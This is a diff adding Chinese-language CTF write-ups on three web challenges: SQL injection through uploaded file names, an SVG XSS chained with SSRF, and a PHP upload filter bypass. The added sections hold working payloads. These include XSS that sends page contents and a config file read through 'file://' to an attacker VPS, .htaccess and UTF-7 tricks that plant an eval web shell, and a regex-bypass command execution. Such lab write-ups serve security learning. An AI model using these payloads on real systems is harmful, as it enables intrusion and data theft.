@@ -555,6 +555,75 @@ param()返回name=file的所有参数,但是只有第一个值才能传给$file�
 
 cyberpeace{955bb6e63c29755aeb2f36fc33b3b57f}
 
+### upload
+
+收获:这题的收获还是很大的,第一次了解还有这种注入
+
+翻翻题目的页面,登入,注册,上传,扫目录发现没啥。
+
+根据题目的名称直接跑去测试上传，只能上传.jpg后缀,并且没有文件地址,所以这个如果真的是文件上传漏洞,估计要用auto_prepared_file来，但是只能.jpg后缀。
+
+于是我就跑去测试登入和注册界面尝试能否sql注入,结果都凉凉,看了一眼题目想起了会回显文件名,猜测这里就是题目给我们的注入点。
+
+猜测sql语句,刚开始没有进行这一步,然后试到自闭,
+
+```
+sql="insert into xxx (xxxx....) values ('xxx','xxx'...)"
+sql2="select * from where uuid=xxxxxx"
+
+```
+
+因为uuid在session里,不可注,所以注第一个
+
+因为payload=`'.jpg`时,无回显,所以值是包在`''`之间的,又因为我们不知道value到底有几个值,所以用hex()与`''`相加成为一个新的值
+
+payload=`a'+conv(hex((selselectect '123')),16,10)+'.jpg`
+
+这边转为十进制的原因是:mysql将字符串转为数字时将其视为10进制数据
+
+![](https://s2.ax1x.com/2019/08/29/mbhnzQ.png)
+
+这个是123的十进制表示
+
+接下来就是普通的sql注入了
+
+```python
+
+def dec_to_result(table):
+        result=''
+        for i in table:
+                num=hex(i)
+                for j in range(2,len(num),2):
+                        print(num[j:j+2])
+                        result+=chr(int(num[j:j+2],16))
+        return result
+table=[439855375731,190730038380,478341917793,443982377823,448378594604,469853102693,29299]
+table_result="files,hello_flag_is_here,members"
+column=[452571786591,1718378855]
+column_result="i_am_flag"
+content=[142293811309,409438006885,409198488673,103]
+print(dec_to_result(content))
+```
+
+#### 解法二
+
+猜测insert into 的结构为 insert into xxx (xx,xx,xx) values ('xx',uuid,uuid)然后
+
+payload=`hello',1660,1660)#.jpg`
+
+出现回显!!!
+
+payload:
+
+数据库名:`hello',1660,1660),(database(),1660,1660)#.jpg`
+
+表名:`hello',1660,1660),((selselectect GROUP_CONCAT(table_name) FROfromM information_schema.tables WHERE TABLE_SCHEMA=database()),1660,1660)#.jpg`
+
+列名:`hello',1660,1660),((selselectect GROUP_CONCAT(column_name) FROfromM information_schema.columns WHERE table_name='hello_flag_is_here'),1660,1660)#.jpg`
+
+flag:`hello',1660,1660),((selselectect GROUP_CONCAT(i_am_flag) FROfromM hello_flag_is_here),1660,1660)#.jpg`
+
+
 ## bugku
 
 ### login3
@@ -1247,6 +1316,171 @@ int main(int argc, char *argv[])
 
 最后的flag:FLAG{W0w U sh0cked m3 by 5h3115h0ck}
 
+### xssrf_leak
+
+收获:大开眼界,ssrf的一种方式
+
+第一次做到ssrf的题目,虽然懂原理但不代表会利用。
+
+在上一题的xss中得到<svg/onload=>可以利用,用admin的cookie登入,不行。
+
+在看了别人的wp的时候发现可以ssrf,但是这里innerHTML属性被ban掉了,结合svg 会转化实体编码的特性将 代码转化为实体编码后便不存在黑名单了
+
+读innerHTML的代码
+
+`<svg/onload="document.location='http://xxxxx/'+document.innerHTML">`
+
+得到
+
+```html
+
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XSSRF</a>
+
+  <ul class="navbar-nav">
+    <li class="nav-item">
+      <a class="nav-link" href="sendmail.php">Send Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="mailbox.php">Mailbox</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="sentmail.php">Sent Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="setadmin.php">Set Admin</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="request.php">Send Request</a>
+    </li>
+  </ul>
+
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item">
+      <span class="navbar-text">Hello, admin (Administrator)</span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="logout.php">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+    <div class="container">
+
+      <div class="card text-white bg-dark">
+        <div class="card-body">
+          <h2 class="card-title">
+            aa          </h2>
+          <h4>From: <a href="sendmail.php?to=ccreater">ccreater</a></h4>
+          <div class="card-text"><svg onload="document.location='http://39.108.164.219:60000/'+btoa(document.body.innerHTML)"></svg></div>
+        </div>
+      </div>
+    </div>
+```
+
+发现response.php结合题目这里就是我们进行ssrf的点
+
+于是要访问response.php
+
+```html
+<svg/onload="
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open("GET","request.php",true);
+xmlhttp.send();
+">
+```
+
+发现参数url,尝试php伪协议结合robots.txt,尝试读取/var/www/html/config.php
+
+```html
+<svg/onload="
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open("POST","request.php",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("url=file:///var/www/html/config.php");
+">
+```
+
+得到:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSSRF - Request</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="style.css" media="all">
+    <style>pre { background-color: #eee; padding: 5px; }</style>
+  </head>
+  <body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XSSRF</a>
+
+  <ul class="navbar-nav">
+    <li class="nav-item">
+      <a class="nav-link" href="sendmail.php">Send Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="mailbox.php">Mailbox</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="sentmail.php">Sent Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="setadmin.php">Set Admin</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="request.php">Send Request</a>
+    </li>
+  </ul>
+
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item">
+      <span class="navbar-text">Hello, admin (Administrator)</span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="logout.php">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+    <div class="container">
+
+      <pre><code>&lt;&quest;php&NewLine;&NewLine;&sol;&sol; database config&NewLine;define&lpar;&apos;DB&lowbar;USER&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;PASS&apos;&comma; &apos;xssrfmeplz&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;HOST&apos;&comma; &apos;host&equals;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;NAME&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;&NewLine;&sol;&sol; redis config&NewLine;define&lpar;&apos;REDIS&lowbar;HOST&apos;&comma; &apos;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;REDIS&lowbar;PORT&apos;&comma; 25566&rpar;&semi;&NewLine;&NewLine;&sol;&sol; define flag&NewLine;define&lpar;&apos;FLAG&apos;&comma; &apos;FLAG&lbrace;curl -v -o flag --next flag&colon;&sol;&sol;in-the&period;redis&sol;the&quest;port&equals;25566&amp;good&equals;luck&rcub;&apos;&rpar;&semi;&NewLine;&NewLine;&dollar;c&lowbar;hardness &equals; 5&semi; &sol;&sol; how many proof of work leading zeros&NewLine;</code></pre>
+
+      <form action="/request.php" method="POST">
+        <div class="form-group">
+          <label for="url">URL</label>
+          <textarea name="url" class="form-control" id="url" aria-describedby="url" placeholder="URL" rows="10">file:///var/www/html/config.php</textarea>
+        </div>
+
+        <button class="btn btn-primary">Send Request</button>
+      </form>
+    </div>
+  </body>
+</html>
+
+```
+
+得到flag:FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&good=luck}
+
+
+
 ## 杂
 
 ### 2019suctf CheckIn
@@ -1254,4 +1488,115 @@ int main(int argc, char *argv[])
 这一题是个文件上传,限制了后缀为ph*和.htaccess的文件
 
 我一直试都没弄出来后来看别人的wp说使用.user.ini,fastcgi都可以用,学到了学到了
+
+### 2019xnusa ezphp
+
+```php
+<?php 
+    $files = scandir('./');  
+    foreach($files as $file) { 
+        if(is_file($file)){ 
+            if ($file !== "index.php") { 
+                unlink($file); 
+            } 
+        } 
+    } 
+    include_once("fl3g.php"); 
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) { 
+        highlight_file(__FILE__); 
+        die(); 
+    } 
+    $content = $_GET['content']; 
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { 
+        echo "Hacker"; 
+        die(); 
+    } 
+    $filename = $_GET['filename']; 
+    if(preg_match("/[^a-z\.]/", $filename) == 1) { 
+        echo "Hacker"; 
+        die(); 
+    } 
+    $files = scandir('./');  
+    foreach($files as $file) { 
+        if(is_file($file)){ 
+            if ($file !== "index.php") { 
+                unlink($file); 
+            } 
+        } 
+    } 
+    file_put_contents($filename, $content . "\nJust one chance"); 
+?>
+```
+
+这题说是easy,但对我来说却不easy
+
+代码在刚开始和写文件之前会删除除了index.php之外的所有文件
+
+但是却会包含f13g.php,有几种可能:web权限无法删除,不在这个目录,或者根本不存在只是作为题目的突破点。做完题目发现是第三种可能。
+
+根据代码的行为,可以通过.htaccess和.user.ini来设置auto_preared_file为本身来实现代码执行
+
+#### 解法一
+
+利用.htaccess在换行前加一个\\ 将视两行为一行的特性来绕过黑名单的限制
+
+payload:
+
+`auto_prepend_fi\
+le ".htaccess"
+#<?php phpinfo();?>
+#\`
+
+#### 解法二
+
+利用题目包含f13g.php的特性。
+
+用.htaccess修改error_log的路径和文件名,将错误信息写入到/tmp/fl3g.php里,但是由于html编码错误信息,所以要编码要执行的代码
+
+payload:
+
+- 第一步，通过error_log配合include_path在tmp目录生成shell
+
+```
+php_value error_log /tmp/fl3g.php
+php_value error_reporting 32767
+php_value include_path "+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"
+# \
+```
+
+- 第二步，通过include_path和utf7编码执行shell
+
+```
+php_value include_path "/tmp"
+php_value zend.multibyte 1
+php_value zend.script_encoding "UTF-7"
+# \
+```
+
+#### 解法三
+
+因为正则判断写的是`if(preg_match("/[^a-z\.]/", $filename) == 1) {`而不是`if(preg_match("/[^a-z\.]/", $filename) !== 0) {`，因此存在了被绕过的可能。 通过设置.htaccess
+
+```
+php_value pcre.backtrack_limit 0
+php_value pcre.jit 0
+```
+
+导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。
+
+payload:
+
+first. 
+
+```
+/?filename=.htaccess&content=php_value pcre.backtrack_limit 0
+php_value pcre.jit 0
+#\
+```
+
+second.
+
+```
+http://192.168.99.100:32772/?a=system('cat %2fflag');exit;&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw%2FcGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c<<&filename=php://filter/write=convert.base64-decode/resource=.htaccess
+```
 
